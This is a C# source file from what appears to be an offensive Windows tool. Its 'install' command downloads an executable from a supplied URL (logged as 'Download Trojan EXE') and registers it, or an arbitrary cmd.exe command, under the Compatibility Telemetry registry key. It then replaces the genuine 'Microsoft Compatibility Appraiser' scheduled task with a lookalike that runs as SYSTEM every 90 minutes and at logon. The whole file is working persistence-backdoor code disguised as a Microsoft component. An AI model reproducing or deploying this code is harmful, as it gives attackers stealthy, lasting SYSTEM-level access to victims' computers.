using TELEMETRY.lib;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Threading;
using Microsoft.Win32;
using TaskScheduler;

namespace TELEMETRY.Commands
{
    public class Vaults : ICommand
    {
        public static string CommandName => "install";



        public static void DeleteTask(string taskName)
        {
            TaskSchedulerClass ts = new TaskSchedulerClass();
            ts.Connect(null, null, null, null);
            ITaskFolder folder = ts.GetFolder("\\Microsoft\\Windows\\Application Experience");
            folder.DeleteTask(taskName, 0);
        }

        public static _TASK_STATE CreateTaskScheduler(string creator, string taskName, string path, string interval, string startBoundary, string description)
        {
            try
            {
                //new scheduler
                TaskSchedulerClass scheduler = new TaskSchedulerClass();
                //pc-name/ip,username,domain,password
                scheduler.Connect(null, null, null, null);
                //get scheduler folder;
                ITaskFolder folder = scheduler.GetFolder("\\Microsoft\\Windows\\Application Experience");

                //set base attr 
                ITaskDefinition task = scheduler.NewTask(0);
                task.RegistrationInfo.Author = creator;//creator
                task.RegistrationInfo.Description = description;//description

                ITriggerCollection TriggerCollection = task.Triggers;
                ILogonTrigger LogonTrigger = (ILogonTrigger)TriggerCollection.Create(_TASK_TRIGGER_TYPE2.TASK_TRIGGER_LOGON);
                LogonTrigger.Enabled = true;

                task.Principal.GroupId = "S-1-5-18"; // LocalSystem

                //set trigger  (IDailyTrigger ITimeTrigger)
                ITimeTrigger tt = (ITimeTrigger)task.Triggers.Create(_TASK_TRIGGER_TYPE2.TASK_TRIGGER_TIME);
                tt.Repetition.Interval = interval;// format PT1H1M==1小时1分钟 设置的值最终都会转成分钟加入到触发器
                tt.StartBoundary = startBoundary;//start time

                //set action
                IExecAction action = (IExecAction)task.Actions.Create(_TASK_ACTION_TYPE.TASK_ACTION_EXEC);
                action.Path = path;//计划任务调用的程序路径

                task.Settings.ExecutionTimeLimit = "PT0S"; //运行任务时间超时停止任务吗? PTOS 不开启超时
                task.Settings.DisallowStartIfOnBatteries = false;
                task.Settings.RunOnlyIfIdle = false;//仅当计算机空闲下才执行
                IRegisteredTask regTask = folder.RegisterTaskDefinition(taskName, task,
                                                                    (int)_TASK_CREATION.TASK_CREATE, null, //user
                                                                    null, // password
                                                                    _TASK_LOGON_TYPE.TASK_LOGON_INTERACTIVE_TOKEN,
                                                                    "");
                IRunningTask runTask = regTask.Run(null);
                return runTask.State;

            }
            catch (Exception ex)
            {
                throw ex;
            }

        }

        public void Edit(string Fileto)
        {
            Console.WriteLine("\r\n[*] Action: Edit Regedit");

            RegistryKey key = Registry.LocalMachine;
            RegistryKey software = key.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\TelemetryController\\Levint");
            software.SetValue("Command", Fileto);
            software.SetValue("Nightly", 1, RegistryValueKind.DWord);
            Check();
        }

        public void Edit_command(string command)
        {
            Console.WriteLine("\r\n[*] Action: Edit Regedit");
            command = "C:\\WINDOWS\\system32\\cmd.exe /c " + command;
            RegistryKey key = Registry.LocalMachine;
            RegistryKey software = key.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\TelemetryController\\Levint");
            software.SetValue("Command", command);
            software.SetValue("Nightly", 1, RegistryValueKind.DWord);
            Check();
        }

        public void Check()
        {
            RegistryKey KeyA = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\TelemetryController");
            KeyA = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\TelemetryController\\Levint\\", true);
            //Command
            String Command = KeyA.GetValue("Command", "").ToString();
            if (Command.Length != 0)
            {
                Console.WriteLine("[>] Command: " + Command);
            }
            else
            {
                Console.WriteLine("\r\n[!] Command not Found:\r\n");
            }
            //Time
            String Nightly = KeyA.GetValue("Nightly", "").ToString();
            if (Nightly.Length != 0)
            {
                Console.WriteLine("[>] Nightly: " + Nightly);
            }
            else
            {
                Console.WriteLine("\r\n[!] Time not Found:\r\n");
            }
            KeyA.Close();
        }
        public void Download(string target,string Fileto)
        {
            var mutexes = new WaitHandle[1];
            var downloads = new Dictionary<string, ManualResetEvent>();

            var downloader = new GidoraDownloader();
            downloader.ExceptionThrown += (sender, eventArgs) =>
            {
            };

            downloader.DownloadCompleted += (sender, eventArgs) =>
            {
                var result = eventArgs.Result;


                if (!result.FileExists)
                {
                    Console.WriteLine("File not found");
                }

                downloads[result.FileUrl].Set();
            };
            double lastPercent = 0.0;
            var lastPercents = new Dictionary<string, double>();
            downloader.ProgressChanged += (sender, eventArgs) =>
            {
                lock (lastPercents)
                {
                    lastPercent = lastPercents[eventArgs.FileUrl];
                }

                double percent = (double)eventArgs.Progress / eventArgs.FileLength * 100.0;

                if (percent >= lastPercent + 1.0 || eventArgs.Progress == eventArgs.FileLength)
                {
                    lastPercent = percent;
                    lock (lastPercents)
                    {
                        lastPercents[eventArgs.FileUrl] = lastPercent;
                    }
                }
            };
            var source = new CancellationTokenSource();

            for (int i = 0; i < 1; i++)
            {
                mutexes[i] = new ManualResetEvent(false);
                downloads.Add(target, (ManualResetEvent)mutexes[i]);
                lastPercents.Add(target, 0.0);

                //Calculate destination path  

                downloader.DownloadAsync(target, Fileto, 2, source.Token);
            }

            WaitHandle.WaitAll(mutexes);
            string filePath = new Uri(target).Segments.Last();
            Console.WriteLine("[>] Download To: " + Fileto + "\r\n");
        }

        public static IRegisteredTaskCollection GetAllTasks()
        {
            TaskSchedulerClass ts = new TaskSchedulerClass();
            ts.Connect(null, null, null, null);
            ITaskFolder folder = ts.GetFolder("\\Microsoft\\Windows\\Application Experience");
            IRegisteredTaskCollection tasks_exists = folder.GetTasks(1);
            return tasks_exists;
        }

        public static bool IsExists(string taskName)
        {
            var isExists = false;
            IRegisteredTaskCollection tasks_exists = GetAllTasks();
            for (int i = 1; i <= tasks_exists.Count; i++)
            {
                IRegisteredTask t = tasks_exists[i];
                if (t.Name.Equals(taskName))
                {
                    isExists = true;
                    break;
                }
            }
            return isExists;
        }
        public void Execute(Dictionary<string, string> arguments)
        {
            
            arguments.Remove("vaults");

            if (!IsExists("Microsoft Compatibility Appraiser"))
            {
                Console.WriteLine("\n[X] Don't have Appraiser, Unable to Telemetry!\n");
                System.Environment.Exit(0);

            }
            else
            {
                Console.WriteLine("\n[Y] Computer have Appraiser, Can use Telemetry!!\n");
            }


            if (arguments.ContainsKey("/url"))
            {
                Console.WriteLine("[*] Action: Download Trojan EXE");
                string target = arguments["/url"].Trim('"').Trim('\'');
                var FileUrl = target;

                Console.WriteLine("[>] Download From: "+target);
                if (arguments.ContainsKey("/path"))
                {
                    string to = arguments["/path"].Trim('"').Trim('\'');
                    var Fileto = to;
                    Download(FileUrl, Fileto);
                    Edit(Fileto);

                }
                else
                {
                    string to = "C:\\Windows\\Temp\\compattelrun.exe";
                    var Fileto = to;
                    Download(FileUrl, Fileto);
                    Edit(Fileto);

                }             

            }
            else
            {
                if (arguments.ContainsKey("/path"))
                {
                    string to = arguments["/path"].Trim('"').Trim('\'');
                    var Fileto = to;
                    Edit(Fileto);
                }

            }

            if (arguments.ContainsKey("/command"))
            {
                string command = arguments["/command"].Trim('"').Trim('\'');
                Edit_command(command);
            }

            DeleteTask("Microsoft Compatibility Appraiser");

            //创建者
            string creator = "Microsoft Corporation";
            //计划任务名称
            string taskName = "Microsoft Compatibility Appraiser";
            //执行的程序路径
            string path = "%windir%\\system32\\compattelrunner.exe";
            //计划任务执行的频率 PT1M一分钟  PT1H30M 90分钟
            string interval = "PT1H30M";
            //开始时间 请遵循 yyyy-MM-ddTHH:mm:ss 格式
            DateTime currentTime = DateTime.Now;
            var startBoundary = currentTime.ToString("yyyy-MM-ddTHH:mm:ss");

            var description = "如果已选择加入 Microsoft 客户体验改善计划，则会收集程序遥测信息";

            _TASK_STATE state = CreateTaskScheduler(creator, taskName, path, interval, startBoundary, description);
            if (state == _TASK_STATE.TASK_STATE_RUNNING)
            {
                String msg = "";
                Console.WriteLine("\r\n[*] Action: " + interval + " 时间间隔计划后门修改成功!");
                Console.WriteLine("[>] wait a moment... \r\n");

            }


        }
    }
}